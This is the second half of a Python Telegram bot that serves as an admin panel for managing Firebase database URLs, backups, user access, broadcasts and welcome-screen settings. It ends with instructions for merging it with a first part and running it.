        await context.bot.send_message(
            user.id, "🏠 Main Menu",
            reply_markup=main_menu_keyboard(admin),
        )
        return

    # ── admin:home ─────────────────────────────────────────────
    if data == "admin:home":
        try:
            await q.message.delete()
        except Exception:
            pass
        brand = await get_setting("bot_brand_name", BOT_BRAND_NAME)
        await context.bot.send_message(
            user.id,
            ui_screen("👑", f"{brand} — ADMIN PANEL",
                      ui_box("Select a section below")),
            parse_mode=ParseMode.HTML,
            reply_markup=admin_menu_keyboard(),
        )
        return

    # ── DB PAGE ────────────────────────────────────────────────
    if data.startswith("db:page:"):
        if not is_admin(user.id):
            return
        page = int(data.split(":")[-1])
        try:
            await q.edit_message_reply_markup(reply_markup=db_panel_keyboard(page))
        except BadRequest:
            pass
        return

    # ── DB VIEW ────────────────────────────────────────────────
    if data.startswith("db:view:"):
        name = data[8:]
        url  = DATABASES.get(name, "")
        h    = _fb_health.get(name, {})
        status = h.get("status", "unknown")
        last_check = fmt_date(
            datetime.fromtimestamp(h["last_check"]).isoformat()
            if "last_check" in h else None
        )
        icon = get_db_status_icon(name)
        text = ui_screen(
            icon, f"DB: {name}",
            ui_box(
                ui_kv("🔗", "URL", f"<code>{html_escape(url[:60])}</code>"),
                ui_kv("📊", "Status", status.upper()),
                ui_kv("🕐", "Last Check", last_check),
            ),
        )
        kb = InlineKeyboardMarkup([
            [_ikb("🔥 Ping", callback_data=f"db:ping:{name}", style="success")],
            [_ikb("🧬 Clone", callback_data=f"db:clone_this:{name}", style="primary")],
            [_ikb("🗑 Remove", callback_data=f"db:remove:{name}", style="danger")],
            back_row("admin:home"),
        ])
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb)
        except BadRequest:
            pass
        return

    # ── DB PING ────────────────────────────────────────────────
    if data.startswith("db:ping:"):
        name = data[8:]
        url  = DATABASES.get(name, "")
        if not url:
            await q.answer("DB not found", show_alert=True)
            return
        session = await get_http_session()
        alive = await _ping_firebase(url, session)
        status = "🟢 ALIVE" if alive else "🔴 DEAD"
        _fb_health[name] = {"status": "alive" if alive else "dead", "last_check": time.time(), "url": url}
        await q.answer(f"{name}: {status}", show_alert=True)
        return

    # ── DB REMOVE ─────────────────────────────────────────────
    if data.startswith("db:remove:"):
        if not is_admin(user.id):
            return
        name = data[10:]
        DATABASES.pop(name, None)
        _fb_health.pop(name, None)
        await q.answer(f"✅ Removed {name}")
        try:
            await q.edit_message_reply_markup(reply_markup=db_panel_keyboard(0))
        except BadRequest:
            pass
        return

    # ── DB HEALTH ─────────────────────────────────────────────
    if data == "db:health":
        if not is_admin(user.id):
            return
        await q.answer("⏳ Running health check...")
        session = await get_http_session()
        results = await run_firebase_health_check(session)
        alive = sum(1 for s in results.values() if s == "alive")
        dead  = sum(1 for s in results.values() if s == "dead")
        await q.answer(f"✅ Done: {alive} alive, {dead} dead", show_alert=True)
        try:
            await q.edit_message_reply_markup(reply_markup=db_panel_keyboard(0))
        except BadRequest:
            pass
        return

    # ── DB REMOVE DEAD ────────────────────────────────────────
    if data == "db:remove_dead":
        if not is_admin(user.id):
            return
        count = await remove_dead_databases()
        await q.answer(f"🗑 Removed {count} dead DBs", show_alert=True)
        try:
            await q.edit_message_reply_markup(reply_markup=db_panel_keyboard(0))
        except BadRequest:
            pass
        return

    # ── DB ADD ────────────────────────────────────────────────
    if data == "db:add":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "add_db"}
        await q.answer()
        await context.bot.send_message(
            user.id,
            "📥 <b>Send DB info:</b>\n\n<code>DB_NAME https://your-firebase-url</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── DB CLONE THIS ─────────────────────────────────────────
    if data.startswith("db:clone_this:"):
        if not is_admin(user.id):
            return
        src = data[14:]
        pending_action[user.id] = {"action": "clone_db"}
        await context.bot.send_message(
            user.id,
            f"🧬 <b>Clone:</b> <code>{html_escape(src)}</code>\n\n"
            f"Send: <code>{html_escape(src)} NEW_NAME</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── MONITOR TOGGLE ────────────────────────────────────────
    if data == "monitor:toggle":
        new_state = await toggle_monitor(user.id)
        status = "🟢 ON" if new_state else "🔴 OFF"
        await q.answer(f"Live Monitor: {status}", show_alert=True)
        return

    # ── HUB PAGE ──────────────────────────────────────────────
    if data.startswith("hub:page:"):
        page = int(data.split(":")[-1])
        await _show_user_hub(update, context, user.id, page, edit=True)
        return

    # ── HUB CLEAR ────────────────────────────────────────────
    if data == "hub:clear":
        async with db() as conn:
            conn.execute("DELETE FROM user_hub WHERE user_id=?", (user.id,))
        await q.answer("🗑 History cleared", show_alert=True)
        await _show_user_hub(update, context, user.id, 0, edit=True)
        return

    # ── BACKUP NOW ────────────────────────────────────────────
    if data == "backup:now":
        if not is_admin(user.id):
            return
        await q.answer("⏳ Sending backup...")
        ok = await send_backup(context.bot, user.id)
        await q.answer("✅ Backup sent!" if ok else "❌ Backup failed", show_alert=True)
        return

    # ── BACKUP TOGGLE AUTO ────────────────────────────────────
    if data == "backup:toggle_auto":
        if not is_admin(user.id):
            return
        cur = await get_setting_bool("auto_db_enabled", False)
        await set_setting("auto_db_enabled", "0" if cur else "1")
        await q.answer(f"Auto backup: {'OFF' if cur else 'ON'}", show_alert=True)
        return

    # ── BACKUP SET TARGET ─────────────────────────────────────
    if data == "backup:set_target":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "set_backup_target"}
        await context.bot.send_message(
            user.id,
            "📤 <b>Send target chat ID</b> (group/channel ID):",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── BACKUP HISTORY ────────────────────────────────────────
    if data == "backup:history":
        if not is_admin(user.id):
            return
        history = await get_backup_history(10)
        lines = []
        for h in history:
            sz = fmt_size(h.get("size_bytes") or 0)
            ts = fmt_date(h.get("timestamp"))
            fn = h.get("filename", "—")
            lines.append(f"📦 {ts}\n   {html_escape(fn)} · {sz}")
        block = ui_box("\n\n".join(lines) if lines else "📭 No backups yet.")
        text = ui_screen("💾", "BACKUP HISTORY", block)
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup([back_row("admin:home")]))
        except BadRequest:
            pass
        return

    # ── CLONE START ───────────────────────────────────────────
    if data == "clone:start":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "clone_db"}
        await context.bot.send_message(
            user.id,
            "🧬 <b>Clone a DB</b>\n\nSend: <code>SOURCE_NAME NEW_NAME</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── CLONE LIST ────────────────────────────────────────────
    if data.startswith("clone:list:"):
        if not is_admin(user.id):
            return
        page = int(data.split(":")[-1])
        clones = await get_cloned_panels()
        per_page = 5
        start = page * per_page
        items = clones[start:start+per_page]
        total_pages = max(1, (len(clones) + per_page - 1) // per_page)
        lines = []
        for c in items:
            lines.append(
                f"🧬 <b>{html_escape(c['name'])}</b>\n"
                f"   ← {html_escape(c.get('source_name') or '?')}"
            )
        block = ui_box("\n\n".join(lines) if lines else "📭 None.")
        text = ui_screen("🧬", "CLONE LIST", block, subtitle=f"Page {page+1}/{total_pages}")
        nav = []
        if page > 0:
            nav.append(_ikb("⬅", callback_data=f"clone:list:{page-1}", style="primary"))
        if page < total_pages - 1:
            nav.append(_ikb("➡", callback_data=f"clone:list:{page+1}", style="primary"))
        rows_kb = [nav] if nav else []
        rows_kb.append(back_row("admin:home"))
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(rows_kb))
        except BadRequest:
            pass
        return

    # ── CUSTOMIZE ─────────────────────────────────────────────
    if data == "cust:edit_text":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "set_welcome_text"}
        await context.bot.send_message(
            user.id,
            "✏ <b>Send new welcome text:</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    if data == "cust:edit_media":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "set_welcome_media"}
        await context.bot.send_message(
            user.id,
            "🖼 <b>Send photo, video, or GIF for welcome screen:</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    if data == "cust:clear_media":
        if not is_admin(user.id):
            return
        await clear_welcome_media()
        await q.answer("🗑 Media cleared", show_alert=True)
        return

    if data == "cust:preview":
        wc = await get_welcome_config()
        media_id = wc.get("media_file_id")
        media_type = wc.get("media_type") or "photo"
        text = await build_welcome_text(user)
        if media_id:
            try:
                if media_type == "photo":
                    await context.bot.send_photo(user.id, media_id, caption=text, parse_mode=ParseMode.HTML)
                elif media_type == "video":
                    await context.bot.send_video(user.id, media_id, caption=text, parse_mode=ParseMode.HTML)
                elif media_type in ("animation", "gif"):
                    await context.bot.send_animation(user.id, media_id, caption=text, parse_mode=ParseMode.HTML)
            except Exception:
                await context.bot.send_message(user.id, text, parse_mode=ParseMode.HTML)
        else:
            await context.bot.send_message(user.id, text, parse_mode=ParseMode.HTML)
        await q.answer("👁 Preview sent")
        return

    if data == "cust:brand":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "set_brand"}
        await context.bot.send_message(
            user.id,
            "🏷 <b>Send new brand name:</b>",
            parse_mode=ParseMode.HTML,
        )
        return

    # ── USER ACCESS ───────────────────────────────────────────
    if data == "user:grant":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "grant_user"}
        await context.bot.send_message(user.id, "📨 Send the User ID to grant access:")
        return

    if data == "user:revoke":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "revoke_user"}
        await context.bot.send_message(user.id, "🚫 Send the User ID to revoke access:")
        return

    # ── USER BROADCAST ────────────────────────────────────────
    if data == "user:broadcast":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "broadcast"}
        await context.bot.send_message(
            user.id,
            "📡 <b>Send broadcast message:</b>\n\n"
            "It will be sent to all users in the system.\n"
            "HTML formatting supported.",
            parse_mode=ParseMode.HTML,
        )
        return

    if data.startswith("user:list:"):
        if not is_admin(user.id):
            return
        page = int(data.split(":")[-1])
        per_page = 10
        items = list(allowed_users)
        start = page * per_page
        chunk = items[start:start+per_page]
        total_pages = max(1, (len(items) + per_page - 1) // per_page)
        lines = [f"🔑 <code>{uid}</code>" for uid in chunk]
        block = ui_box("\n".join(lines) if lines else "📭 No allowed users.")
        text = ui_screen("👥", "ALLOWED USERS", block, subtitle=f"Page {page+1}/{total_pages}")
        nav = []
        if page > 0:
            nav.append(_ikb("⬅", callback_data=f"user:list:{page-1}", style="primary"))
        if page < total_pages - 1:
            nav.append(_ikb("➡", callback_data=f"user:list:{page+1}", style="primary"))
        rows_kb = [nav] if nav else []
        rows_kb.append(back_row("admin:home"))
        try:
            await q.edit_message_text(text, parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(rows_kb))
        except BadRequest:
            pass
        return

    # ── SETTINGS ──────────────────────────────────────────────
    if data == "settings:toggle_grant":
        if not is_admin(user.id):
            return
        cur = await get_setting_bool("grant_access_required", True)
        await set_setting("grant_access_required", "0" if cur else "1")
        await q.answer(f"Access control: {'OFF' if cur else 'ON'}", show_alert=True)
        return

    if data == "settings:toggle_referral":
        if not is_admin(user.id):
            return
        cur = await get_setting_bool("referral_enabled", True)
        await set_setting("referral_enabled", "0" if cur else "1")
        await q.answer(f"Referral system: {'OFF' if cur else 'ON'}", show_alert=True)
        return

    if data == "settings:poll":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "set_poll_interval"}
        await context.bot.send_message(user.id, "⏱ Send poll interval in seconds (min 5):")
        return

    if data == "settings:refs":
        if not is_admin(user.id):
            return
        pending_action[user.id] = {"action": "set_refs_required"}
        await context.bot.send_message(user.id, "🔢 Send number of referrals required:")
        return


# ══════════════════════════════════════════════════════════════
#  SLASH COMMANDS (admin shortcuts)
# ══════════════════════════════════════════════════════════════

async def cmd_grant(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /grant USER_ID")
        return
    try:
        uid = int(context.args[0])
        await grant_access(uid, update.effective_user.id)
        await update.message.reply_text(f"✅ Granted: <code>{uid}</code>", parse_mode=ParseMode.HTML)
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID")


async def cmd_revoke(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /revoke USER_ID")
        return
    try:
        uid = int(context.args[0])
        await revoke_access(uid)
        await update.message.reply_text(f"🚫 Revoked: <code>{uid}</code>", parse_mode=ParseMode.HTML)
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid user ID")


async def cmd_adddb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args or len(context.args) < 2:
        await update.message.reply_text("Usage: /adddb DB_NAME https://url")
        return
    name = context.args[0]
    url  = context.args[1]
    DATABASES[name] = url
    await update.message.reply_text(
        f"✅ Added: <code>{html_escape(name)}</code>", parse_mode=ParseMode.HTML
    )


async def cmd_removedb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: /removedb DB_NAME")
        return
    name = " ".join(context.args)
    if name in DATABASES:
        DATABASES.pop(name)
        await update.message.reply_text(
            f"🗑 Removed: <code>{html_escape(name)}</code>", parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text("❌ DB not found")


async def cmd_backup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text("⏳ Preparing backup...")
    ok = await send_backup(context.bot, update.effective_user.id)
    if not ok:
        await update.message.reply_text("❌ Backup failed")


async def cmd_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    new_state = await toggle_monitor(update.effective_user.id)
    status = "🟢 ON" if new_state else "🔴 OFF"
    await update.message.reply_text(
        f"📡 <b>Live Monitor: {status}</b>", parse_mode=ParseMode.HTML
    )


async def cmd_health(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    await update.message.reply_text("⏳ Checking all Firebase DBs...")
    session = await get_http_session()
    results = await run_firebase_health_check(session)
    alive = sum(1 for s in results.values() if s == "alive")
    dead  = sum(1 for s in results.values() if s == "dead")
    await update.message.reply_text(
        f"✅ Health check done:\n🟢 Alive: <b>{alive}</b>\n🔴 Dead: <b>{dead}</b>",
        parse_mode=ParseMode.HTML,
    )


async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not is_admin(update.effective_user.id):
        return
    await _admin_stats_text(update, context)


# ══════════════════════════════════════════════════════════════
#  ERROR HANDLER
# ══════════════════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    err = context.error
    if isinstance(err, (Conflict, asyncio.CancelledError)):
        return
    if isinstance(err, RetryAfter):
        await asyncio.sleep(err.retry_after)
        return
    if isinstance(err, (Forbidden, ChatMigrated)):
        return
    log.error("Update error: %s", traceback.format_exc())


# ══════════════════════════════════════════════════════════════
#  HEALTH ENDPOINT (for Render/Railway keep-alive)
# ══════════════════════════════════════════════════════════════

async def health_server() -> None:
    from aiohttp import web

    async def health_check(request):
        return web.Response(
            text=json.dumps({
                "status": "ok",
                "version": BOT_VERSION,
                "dbs": len(DATABASES),
                "users": len(allowed_users),
            }),
            content_type="application/json",
        )

    app = web.Application()
    app.router.add_get("/", health_check)
    app.router.add_get("/health", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", HEALTH_CHECK_PORT)
    await site.start()
    log.info("Health server on port %s", HEALTH_CHECK_PORT)


# ══════════════════════════════════════════════════════════════
#  POST INIT — start background tasks
# ══════════════════════════════════════════════════════════════

async def post_init(app: Application) -> None:
    await init_db()
    await _init_default_settings()
    await migrate_from_json()
    await load_allowed_users()
    await load_monitor_subs()

    # Start background tasks
    app.create_task(poll_loop(app.bot), name="poll_loop")
    app.create_task(auto_backup_loop(app.bot), name="auto_backup_loop")
    app.create_task(firebase_health_loop(app.bot), name="firebase_health_loop")

    # Health server
    try:
        app.create_task(health_server(), name="health_server")
    except Exception as e:
        log.warning("Health server not started: %s", e)

    log.info(
        "SHOWN X PANEL v3.0 ULTRA started | DBs: %d | Allowed: %d",
        len(DATABASES), len(allowed_users),
    )


# ══════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════

def main() -> None:
    global _main_app

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .concurrent_updates(True)
        .build()
    )
    _main_app = app

    # ── Commands ───────────────────────────────────────────────
    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("panel",    cmd_panel))
    app.add_handler(CommandHandler("status",   cmd_status))
    app.add_handler(CommandHandler("hub",      cmd_hub))
    app.add_handler(CommandHandler("admin",    cmd_admin))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("grant",    cmd_grant))
    app.add_handler(CommandHandler("revoke",   cmd_revoke))
    app.add_handler(CommandHandler("adddb",    cmd_adddb))
    app.add_handler(CommandHandler("removedb", cmd_removedb))
    app.add_handler(CommandHandler("backup",   cmd_backup))
    app.add_handler(CommandHandler("monitor",  cmd_monitor))
    app.add_handler(CommandHandler("health",   cmd_health))
    app.add_handler(CommandHandler("stats",    cmd_stats))

    # ── Callback queries ───────────────────────────────────────
    app.add_handler(CallbackQueryHandler(callback_handler))

    # ── Media (welcome screen) ─────────────────────────────────
    app.add_handler(MessageHandler(
        filters.PHOTO | filters.VIDEO | filters.ANIMATION,
        handle_media,
    ))

    # ── Text (reply keyboard + pending actions) ────────────────
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    # ── Error ──────────────────────────────────────────────────
    app.add_error_handler(error_handler)

    log.info("Starting bot polling...")
    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
    )


if __name__ == "__main__":
    main()

# ══════════════════════════════════════════════════════════════
#  PART 2 ENDS HERE
# ══════════════════════════════════════════════════════════════
#
#  HOW TO MERGE:
#  1. Open Part 1 file
#  2. Remove the last 4 lines (# PART 1 ENDS HERE comment block)
#  3. Paste all of Part 2 directly after
#  4. Save as shownXpannel_v3_final.py
#  5. pip install python-telegram-bot aiohttp
#  6. Set BOT_TOKEN at top of Part 1 or export BOT_TOKEN=...
#  7. python shownXpannel_v3_final.py
#
